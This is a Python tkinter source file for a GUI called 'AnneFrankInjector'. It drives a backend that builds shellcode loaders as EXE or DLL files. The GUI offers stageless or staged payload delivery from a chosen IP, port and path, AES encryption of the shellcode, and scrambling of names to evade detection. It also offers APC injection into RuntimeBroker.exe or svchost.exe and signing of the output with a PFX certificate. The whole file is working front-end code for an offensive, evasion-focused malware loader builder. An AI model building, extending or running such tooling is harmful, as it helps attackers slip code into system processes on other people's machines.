#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import platform
import subprocess
import threading
import tkinter as tk
from tkinter import filedialog, messagebox, ttk
from tkinter.scrolledtext import ScrolledText

class AnneFrankGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("AnneFrankInjector - GUI")
        self.root.geometry("720x650")

        # Determine which backend to use
        self.os_name = platform.system()
        if self.os_name == "Windows":
            self.backend = os.path.join("Windows", "main.py")
            self.certs_dir = os.path.join("Windows", "custom_certs")
        else:
            self.backend = os.path.join("Linux", "main.py")
            self.certs_dir = os.path.join("Linux", "custom_certs")

        if not os.path.isfile(self.backend):
            messagebox.showerror("Error", f"Backend not found: {self.backend}\nMake sure you are in the root directory of AnneFrankInjector.")
            sys.exit(1)

        # ========== Main frame ==========
        main_frame = ttk.Frame(root, padding=10)
        main_frame.grid(row=0, column=0, sticky="nsew")
        root.columnconfigure(0, weight=1)
        root.rowconfigure(0, weight=1)

        # ---------- Shellcode file ----------
        ttk.Label(main_frame, text="Shellcode file:").grid(row=0, column=0, sticky="w")
        self.shellcode_path = tk.StringVar()
        ttk.Entry(main_frame, textvariable=self.shellcode_path, width=50).grid(row=0, column=1)
        ttk.Button(main_frame, text="Browse", command=self.browse_shellcode).grid(row=0, column=2)

        # ---------- Mode ----------
        ttk.Label(main_frame, text="Mode:").grid(row=1, column=0, sticky="w")
        self.mode = tk.StringVar(value="stageless")
        ttk.Radiobutton(main_frame, text="Stageless", variable=self.mode, value="stageless").grid(row=1, column=1, sticky="w")
        ttk.Radiobutton(main_frame, text="Staged", variable=self.mode, value="staged").grid(row=1, column=2, sticky="w")

        # ---------- Staged settings (initially hidden) ----------
        self.staged_frame = ttk.LabelFrame(main_frame, text="Staged Settings")
        self.staged_frame.grid(row=2, column=0, columnspan=3, sticky="ew", pady=5)
        self.staged_frame.grid_remove()

        ttk.Label(self.staged_frame, text="IP address:").grid(row=0, column=0, sticky="w")
        self.ip = tk.StringVar()
        ttk.Entry(self.staged_frame, textvariable=self.ip).grid(row=0, column=1, padx=5, pady=2)

        ttk.Label(self.staged_frame, text="Port:").grid(row=1, column=0, sticky="w")
        self.port = tk.StringVar()
        ttk.Entry(self.staged_frame, textvariable=self.port).grid(row=1, column=1, padx=5, pady=2)

        ttk.Label(self.staged_frame, text="Path:").grid(row=2, column=0, sticky="w")
        self.path = tk.StringVar(value="/")
        ttk.Entry(self.staged_frame, textvariable=self.path).grid(row=2, column=1, padx=5, pady=2)

        # ---------- Common options ----------
        self.encrypt = tk.BooleanVar()
        ttk.Checkbutton(main_frame, text="Encrypt shellcode (AES-128-CBC)", variable=self.encrypt).grid(row=3, column=0, columnspan=3, sticky="w")

        self.scramble = tk.BooleanVar()
        ttk.Checkbutton(main_frame, text="Scramble function/variable names", variable=self.scramble).grid(row=4, column=0, columnspan=3, sticky="w")

        # ---------- Format ----------
        ttk.Label(main_frame, text="Output format:").grid(row=5, column=0, sticky="w")
        self.format = tk.StringVar(value="EXE")
        ttk.Radiobutton(main_frame, text="EXE", variable=self.format, value="EXE").grid(row=5, column=1, sticky="w")
        ttk.Radiobutton(main_frame, text="DLL", variable=self.format, value="DLL").grid(row=5, column=2, sticky="w")

        # ---------- APC target ----------
        ttk.Label(main_frame, text="APC injection target:").grid(row=6, column=0, sticky="w")
        self.apc = tk.StringVar(value="RuntimeBroker.exe")
        ttk.Combobox(main_frame, textvariable=self.apc, values=["RuntimeBroker.exe", "svchost.exe"], state="readonly").grid(row=6, column=1, sticky="w")

        # ---------- Output name ----------
        ttk.Label(main_frame, text="Output name (without extension):").grid(row=7, column=0, sticky="w")
        self.output_name = tk.StringVar(value="afloader")
        ttk.Entry(main_frame, textvariable=self.output_name).grid(row=7, column=1, sticky="w")

        # ---------- Code signing ----------
        signing_frame = ttk.LabelFrame(main_frame, text="Code Signing")
        signing_frame.grid(row=8, column=0, columnspan=3, sticky="ew", pady=5)

        ttk.Label(signing_frame, text="Certificate source:").grid(row=0, column=0, sticky="w")
        self.cert_source = tk.StringVar(value="none")
        cert_combo = ttk.Combobox(signing_frame, textvariable=self.cert_source,
                                  values=["none", "custom"],
                                  state="readonly", width=20)
        cert_combo.grid(row=0, column=1, sticky="w", padx=5)
        cert_combo.bind("<<ComboboxSelected>>", self.on_cert_source_change)

        self.pfx_path = tk.StringVar()
        self.pfx_pass = tk.StringVar()
        ttk.Label(signing_frame, text="PFX file:").grid(row=1, column=0, sticky="w")
        self.pfx_entry = ttk.Entry(signing_frame, textvariable=self.pfx_path, width=50)
        self.pfx_entry.grid(row=1, column=1, padx=5, pady=2)
        self.pfx_browse = ttk.Button(signing_frame, text="Browse", command=self.browse_pfx)
        self.pfx_browse.grid(row=1, column=2)

        ttk.Label(signing_frame, text="Password:").grid(row=2, column=0, sticky="w")
        self.pass_entry = ttk.Entry(signing_frame, textvariable=self.pfx_pass, show="*", width=30)
        self.pass_entry.grid(row=2, column=1, sticky="w", padx=5)

        # Initially disable PFX fields until a signing option is selected
        self.pfx_entry.config(state="disabled")
        self.pfx_browse.config(state="disabled")
        self.pass_entry.config(state="disabled")

        # ---------- Generate button ----------
        self.gen_button = ttk.Button(main_frame, text="Generate Loader", command=self.generate)
        self.gen_button.grid(row=9, column=0, columnspan=3, pady=10)

        # ---------- Output text area ----------
        ttk.Label(main_frame, text="Output:").grid(row=10, column=0, sticky="w")
        self.output_text = ScrolledText(main_frame, height=15, width=80)
        self.output_text.grid(row=11, column=0, columnspan=3, sticky="nsew")

        # Configure resizing
        main_frame.columnconfigure(1, weight=1)
        main_frame.rowconfigure(11, weight=1)

        # Bind mode change to show/hide staged frame
        self.mode.trace_add("write", self.toggle_staged_frame)

    def browse_shellcode(self):
        filename = filedialog.askopenfilename(title="Select raw shellcode file", filetypes=[("Binary files", "*.bin"), ("All files", "*.*")])
        if filename:
            self.shellcode_path.set(filename)

    def browse_pfx(self):
        filename = filedialog.askopenfilename(title="Select PFX certificate", filetypes=[("PFX files", "*.pfx"), ("All files", "*.*")])
        if filename:
            self.pfx_path.set(filename)

    def on_cert_source_change(self, event=None):
        src = self.cert_source.get()
        if src == "none":
            self.pfx_entry.config(state="disabled")
            self.pfx_browse.config(state="disabled")
            self.pass_entry.config(state="disabled")
            self.pfx_path.set("")
            self.pfx_pass.set("")
        elif src == "custom":
            self.pfx_entry.config(state="normal")
            self.pfx_browse.config(state="normal")
            self.pass_entry.config(state="normal")
            self.pfx_path.set("")
            self.pfx_pass.set("")

    def toggle_staged_frame(self, *args):
        if self.mode.get() == "staged":
            self.staged_frame.grid()
        else:
            self.staged_frame.grid_remove()

    def generate(self):
        # Basic validation
        if not self.shellcode_path.get():
            messagebox.showerror("Error", "Please select a shellcode file.")
            return
        if self.mode.get() == "staged":
            if not self.ip.get() or not self.port.get() or not self.path.get():
                messagebox.showerror("Error", "Please fill in IP, port, and path for staged mode.")
                return
            try:
                int(self.port.get())
            except ValueError:
                messagebox.showerror("Error", "Port must be a number.")
                return

        # Check signing
        src = self.cert_source.get()
        if src != "none":
            if not self.pfx_path.get():
                messagebox.showerror("Error", "No PFX file selected for signing.")
                return
            if not self.pfx_pass.get():
                messagebox.showerror("Error", "Password is required for signing.")
                return
            if not os.path.exists(self.pfx_path.get()):
                messagebox.showerror("Error", f"PFX file not found: {self.pfx_path.get()}")
                return

        # Disable button while running
        self.gen_button.config(state="disabled")
        self.output_text.delete(1.0, tk.END)

        # Run in a separate thread
        threading.Thread(target=self.run_backend, daemon=True).start()

    def run_backend(self):
        try:
            # Build command line
            cmd = [sys.executable, self.backend, self.mode.get(),
                   "-p", self.shellcode_path.get(),
                   "-f", self.format.get(),
                   "-apc", self.apc.get(),
                   "-o", self.output_name.get()]

            if self.encrypt.get():
                cmd.append("-e")
            if self.scramble.get():
                cmd.append("-s")

            src = self.cert_source.get()
            if src != "none":
                cmd.extend(["-pfx", self.pfx_path.get()])
                if self.pfx_pass.get():
                    cmd.extend(["-pfx-pass", self.pfx_pass.get()])

            if self.mode.get() == "staged":
                cmd.extend(["-i", self.ip.get(),
                            "-po", self.port.get(),
                            "-pa", self.path.get()])

            # Run the subprocess
            self.output_text.insert(tk.END, " ".join(cmd) + "\n" + "="*50 + "\n")
            self.output_text.see(tk.END)
            self.root.update_idletasks()

            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            for line in proc.stdout:
                self.output_text.insert(tk.END, line)
                self.output_text.see(tk.END)
                self.root.update_idletasks()
            proc.wait()

            if proc.returncode == 0:
                messagebox.showinfo("Success", f"Loader generated as {self.output_name.get()}.{self.format.get().lower()}")
            else:
                messagebox.showerror("Error", "Compilation failed. See output for details.")
        except Exception as e:
            self.output_text.insert(tk.END, f"Error: {e}\n")
            messagebox.showerror("Error", str(e))
        finally:
            self.gen_button.config(state="normal")

if __name__ == "__main__":
    root = tk.Tk()
    app = AnneFrankGUI(root)
    root.mainloop()
